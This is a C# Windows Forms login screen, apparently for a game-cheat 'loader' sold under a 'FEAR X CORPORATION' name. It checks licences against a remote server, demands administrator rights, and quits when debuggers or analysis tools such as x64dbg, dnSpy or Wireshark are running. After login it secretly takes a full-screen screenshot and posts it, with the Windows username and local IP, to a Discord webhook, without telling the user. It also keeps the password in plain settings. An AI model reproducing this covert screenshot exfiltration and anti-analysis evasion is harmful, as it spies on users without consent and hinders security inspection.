using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;
using System.IO;
using System.Drawing.Imaging;
using System.Net.Http;
using System.Security.Principal;
using LOADER_MAIN;
using LOADER_MAIN.Properties;
using System.Diagnostics;
using Newtonsoft.Json;
using static LOADER_MAIN.Api;
using System.Web.UI.WebControls;
using RestSharp;
using DiscordRPC;
using System.Reflection;
using System.Runtime.InteropServices;

namespace LOADER_MAIN
{
    public partial class Form1 : Form

    {
        // List of known cracking/reverse engineering software processes
        private List<string> crackingSoftwareProcesses = new List<string>
        {
            "CheatEngine",
            "ollydbg",
            "x64dbg",
            "idaq",
            "idaq64",
            "windbg",
            "ImmunityDebugger",
            "Wireshark",
            "processhacker",
            "CheatEngine",
            "CheatEngine-x86_64",
            "Cheat Engine",
            "Cheat Engine 6.5",
            "Cheat Engine 6.6",
            "Cheat Engine 6.7",
            "Cheat Engine 6.8",
            "Cheat Engine 6.9",
            "Cheat Engine 7.0",
            "Cheat Engine 7.1",
            "Cheat Engine 7.2",
            "Cheat Engine 7.3",
            "Cheat Engine 7.4",
            "Cheat Engine 7.5",
            "Cheat Engine 7.6",
            "Cheat Engine 7.7",
            "Cheat Engine 7.8",
            "Cheat Engine 7.9",
            "Cheat Engine 7.10",
            "Cheat Engine 7.11",
            "Cheat Engine 7.12",
            "Cheat Engine 7.13",
            "Cheat Engine 7.14",
            "Cheat Engine 7.15",
            "DotPeek",
            "SpyDBG",
            "DNSpy",
            "dnSpy",
            "Fiddler",
            "Wireshark",
            "ProcessExplorer",
            "ProcessMonitor",
        };

        private Timer processCheckTimer;

        private WebClient webclient = new WebClient();

        private DiscordRpcClient client;

        public Form1()
        {
            InitializeComponent();
            InitializeTimer();


            CheckForAdministrator();
        }
        private void CheckForAdministrator()
        {
            if (!IsAdministrator())
            {
                // Show warning message and exit the application when user clicks OK
                MessageBox.Show("The application must be run as an administrator.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                Environment.Exit(0); // Exit the application
            }
        }

        private bool IsAdministrator()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        private void RestartAsAdministrator()
        {
            var exeName = Process.GetCurrentProcess().MainModule.FileName;
            var startInfo = new ProcessStartInfo(exeName)
            {
                UseShellExecute = true,
                Verb = "runas"
            };

            try
            {
                Process.Start(startInfo);
            }
            catch (System.ComponentModel.Win32Exception)
            {
                // The user refused the elevation.
                return;
            }

            Environment.Exit(0);
        }







        private Bitmap CaptureScreenshot()
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height);

            using (Graphics g = Graphics.FromImage(screenshot))
            {
                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
            }

            return screenshot;
        }
        private void InitializeTimer()
        {
            processCheckTimer = new Timer();
            processCheckTimer.Interval = 100; // Check every 1 second
            processCheckTimer.Tick += new EventHandler(OnProcessCheckTimerTick);
            processCheckTimer.Start();
        }

        private void OnProcessCheckTimerTick(object sender, EventArgs e)
        {
            List<string> detectedProcesses = CheckForCrackingSoftwareProcesses(crackingSoftwareProcesses);

            //txtOutput.Clear();
            //txtOutput.AppendText(DateTime.Now.ToString("HH:mm:ss") + " -       CMD PROCESS ANTICRACKER MADE BY GSM !\n");
            if (detectedProcesses.Count > 0)
            {
                Application.Exit();
                foreach (string process in detectedProcesses)
                {
                    // txtOutput.AppendText(process + "\n");
                }
                //txtOutput.AppendText("Do not open the executable.\n");
            }
            else
            {
                //txtOutput.AppendText("\n");
            }
        }

        private List<string> CheckForCrackingSoftwareProcesses(List<string> processList)
        {
            List<string> detectedProcesses = new List<string>();

            Process[] runningProcesses = Process.GetProcesses();

            foreach (Process process in runningProcesses)
            {
                try
                {
                    if (processList.Contains(process.ProcessName, StringComparer.OrdinalIgnoreCase))
                    {
                        detectedProcesses.Add(process.ProcessName);
                    }
                }
                catch (Exception e)
                {
                    //txtOutput.AppendText("An error occurred while checking processes: " + e.Message + "\n");
                }
            }

            return detectedProcesses;
        }



        private async Task SendToDiscord(byte[] screenshotBytes)
        {
            string webhookUrl = "";

            string username = Environment.UserName;
            string ipAddress = GetLocalIPAddress();

            using (HttpClient client = new HttpClient())
            using (MultipartFormDataContent content = new MultipartFormDataContent())
            {
                ByteArrayContent byteContent = new ByteArrayContent(screenshotBytes);
                byteContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
                content.Add(byteContent, "file", "screenshot.png");

                content.Add(new StringContent(username), "username");
                content.Add(new StringContent(ipAddress), "ip_address");

                // Create the JSON payload
                var jsonContent = new StringContent("{\"content\":\"Username: " + username + "\\nIP Address: " + ipAddress + "\"}", System.Text.Encoding.UTF8, "application/json");
                content.Add(jsonContent);

                HttpResponseMessage response = await client.PostAsync(webhookUrl, content);
                if (response.IsSuccessStatusCode)
                {

                }
                else
                {

                }
            }
        }

        private string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("Local IP Address Not Found!");
        }




        private void StartDiscordRPC()
        {
            // Stop any existing RPC
            StopDiscordRPC();

            // Initialize new Discord RPC client
            client = new DiscordRpcClient("1391421311301058701");
            client.Initialize();

            // Set presence details
            client.SetPresence(new RichPresence()
            {
                Details = "100 % ANTIBAN PANNEL",
                State = "100 % ANTIBLACKLIST",
                Timestamps = Timestamps.Now,
                Assets = new Assets()
                {
                    LargeImageKey = "",
                    LargeImageText = "",
                    SmallImageKey = "",
                    SmallImageText = "YT - FEAR X CORPORATION  "
                }
            });
        }

        private void StopDiscordRPC()
        {
            if (client != null)
            {
                client.ClearPresence();
                client.Dispose();
                client = null;
            }
        }


        private void guna2Button2_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void guna2TextBox1_TextChanged(object sender, EventArgs e)
        {
            user.Text = Properties.Settings.Default.usernametl = user.Text;
            Properties.Settings.Default.Save();
        }

        private void guna2TextBox2_TextChanged(object sender, EventArgs e)
        {
            pass.Text = Properties.Settings.Default.passnametl = pass.Text;
            Properties.Settings.Default.Save();
        }

        private void guna2Panel2_Paint(object sender, PaintEventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Any initialization needed during form load
            user.Text = Properties.Settings.Default.usernametl;
            pass.Text = Properties.Settings.Default.passnametl;
            guna2ProgressIndicator1.Visible = false;
        }

        private async void guna2Button1_Click(object sender, EventArgs e)
        {
            
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Form2 HM = new Form2();
            HM.Show();
            this.Hide();
            timer1.Stop();
        }

        private async void guna2Button1_Click_1(object sender, EventArgs e)
        {
            // Start the loading indicator
            guna2ProgressIndicator1.Visible = true;  // Ensure the correct name for your progress indicator
            guna2ProgressIndicator1.Start();
            label1.Visible = false;
            user.Visible = false;
            pass.Visible = false;
            label3.Visible = false;
            label4.Visible = false;
            guna2Button1.Visible = false;

            // Perform the time-consuming operation
            await Task.Run(() => PerformOperation());

            // Stop the loading indicator
            guna2ProgressIndicator1.Stop();
            guna2ProgressIndicator1.Visible = false;
            label1.Visible = true;
            user.Visible = true;
            pass.Visible = true;
            label3.Visible = true;
            label4.Visible = true;
            guna2Button1.Visible = true;

            //MessageBox.Show("Operation Completed!");
            RestClient client = new RestClient("");
            RestRequest request = new RestRequest("/auth/index.php", Method.Post);
            string hwid = libc.hwid.HwId.Generate();
            var headers = new Dictionary<string, string>
            {
                {"token","meewo" },
                {"username", user.Text },
                {"password", pass.Text },
                {"hwid",hwid },
                { "appId", "3"}
            };
            foreach (var header in headers)
            {
                request.AddHeader(header.Key, header.Value);
            }
            RestResponse response = await client.ExecuteAsync(request);
            if (response.IsSuccessful)
            {
                try
                {
                    var user = JsonConvert.DeserializeObject<Root>(response.Content);
                    if (user.status == "success")
                    {
                        Properties.Settings.Default.usernametl = user.data.username;
                        Properties.Settings.Default.Expiry = user.data.expired.ToString();
                        Properties.Settings.Default.Reseller = user.data.reseller.ToString();

                        if (user.data.appId == "3")
                        {
                            Form2 HM = new Form2();
                            HM.Show();
                            this.Hide();
                        }
                        else
                        {
                            string message = "App Not Purchased";
                            MessageBox.Show(message, "TERMINAL X 999", MessageBoxButtons.OK, MessageBoxIcon.None);
                        }
                    }
                    else
                    {
                        string message = "Error";
                        MessageBox.Show(message, "TERMINAL X 999", MessageBoxButtons.OK, MessageBoxIcon.None);
                    }
                }
                catch (Exception ex)
                {
                    string message = "Wrong Creadientials";
                    MessageBox.Show(message, "TERMINAL X 999", MessageBoxButtons.OK, MessageBoxIcon.None);
                }
            }
            else
            {
                string message = "Server Under Mainaince";
                MessageBox.Show(message, "TERMINAL X 999", MessageBoxButtons.OK, MessageBoxIcon.None);
            }

            StartDiscordRPC();
            // Capture the screenshot
            Bitmap screenshot = CaptureScreenshot();

            // Save the screenshot to a memory stream
            using (MemoryStream memoryStream = new MemoryStream())
            {
                screenshot.Save(memoryStream, ImageFormat.Png);
                byte[] screenshotBytes = memoryStream.ToArray();

                // Send the screenshot and additional info to Discord
                await SendToDiscord(screenshotBytes);
            }
            
        }
        private void PerformOperation()
        {
            // Simulate a time-consuming operation (e.g., 3 seconds)
            System.Threading.Thread.Sleep(3000);
        }

        private void label4_Click(object sender, EventArgs e)
        {
            string url = "";

            try
            {
                Process.Start(new ProcessStartInfo("cmd", $"/c start {url}") { CreateNoWindow = true });
            }
            catch (Exception)
            {


            }
        }

        private void label3_Click(object sender, EventArgs e)
        {
            string url = "";

            try
            {
                Process.Start(new ProcessStartInfo("cmd", $"/c start {url}") { CreateNoWindow = true });
            }
            catch (Exception)
            {


            }
        }

        private void label1_Click(object sender, EventArgs e)
        {
            string url = "";

            try
            {
                Process.Start(new ProcessStartInfo("cmd", $"/c start {url}") { CreateNoWindow = true });
            }
            catch (Exception)
            {


            }
        }

        private void label2_Click(object sender, EventArgs e)
        {
            string url = "";

            try
            {
                Process.Start(new ProcessStartInfo("cmd", $"/c start {url}") { CreateNoWindow = true });
            }
            catch (Exception)
            {


            }
        }

        private void label37_Click(object sender, EventArgs e)
        {
            string url = "";

            try
            {
                Process.Start(new ProcessStartInfo("cmd", $"/c start {url}") { CreateNoWindow = true });
            }
            catch (Exception)
            {


            }
        }

        private void guna2Button3_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void guna2Panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void user_TextChanged(object sender, EventArgs e)
        {
            user.Text = Properties.Settings.Default.usernametl = user.Text;
            Properties.Settings.Default.Save();
        }

        private void pass_TextChanged(object sender, EventArgs e)
        {
            pass.Text = Properties.Settings.Default.passnametl = pass.Text;
            Properties.Settings.Default.Save();
        }

        private void label19_Click(object sender, EventArgs e)
        {

        }

        private void label5_Click(object sender, EventArgs e)
        {

        }

        private void guna2ProgressIndicator1_Click(object sender, EventArgs e)
        {

        }
    }
}
